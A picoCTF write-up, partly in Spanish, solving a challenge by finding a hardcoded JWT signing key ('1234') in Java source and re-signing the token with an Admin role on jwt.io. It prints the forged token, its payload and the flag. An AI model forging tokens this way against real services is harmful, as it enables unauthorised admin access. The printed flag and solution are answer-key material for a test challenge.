# 7 - Java Code Analysis!?!

## Descripcion:
* BookShelf Pico, my premium online book-reading service.
I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!
Additional details will be available after launching your challenge instance.
* Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
* The 'role' and 'userId' fields in the JWT can be of interest to you!
* The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
* Upgrade your 'role' with the new (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.

## Solucion:
+ http://saturn.picoctf.net:61984/#/
+ http://saturn.picoctf.net:61984/#/dash
+ https://www.jwt.io/
old jws
+ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc2MDU2MjIwMiwiaWF0IjoxNzU5OTU3NDAyLCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.fZFqVUo02W37umOw4u9vGSyHd4rs_FNGojoPMNfjzAQ
new jws con firma
+ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NjA1NjIyMDIsImlhdCI6MTc1OTk1NzQwMiwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.DQckYnEqKtN836Q_VMdGd0by7a6qg-ARV4y5fWAhGG0
payload de token
+ {"role":"Admin","iss":"bookshelf","exp":1760562202,"iat":1759957402,"userId":2,"email":"admin"}

bandera
```
picoCTF{w34k_jwt_n0t_g00d_d72df65e}
```
## Notas:
nos encontramos con un inicio de secion asique ingresamos la contraseña y usuario que nos dieron
+ username: user
+ password: user
despues nos dirigimos a inspeccionar la pagina nos movemos a la columna de almacen(storage)
para ir a la pestaña lateral almacen local(local storage) y nos encontramos un jwt de token y al revisar el zip que nos diron en la carpeta 
bookshelf-pico.zip\src\main\java\io\github\nandandesai\pico\security

hay un archivo llamado SecretGenerator.java en este nos encontramos una firma de token
```python
@Service

class SecretGenerator {

    private Logger logger = LoggerFactory.getLogger(SecretGenerator.class);

    private static final String SERVER_SECRET_FILENAME = "server_secret.txt";

  

    @Autowired

    private UserDataPaths userDataPaths;

  

    private String generateRandomString(int len) {

        // not so random

        return "1234";

    }
```
entonces nos dirigimos a la pagina https://www.jwt.io/ para modificar la firma a 1234

despues modificamos nuestro rol para ser admin en el payload
## Referencias: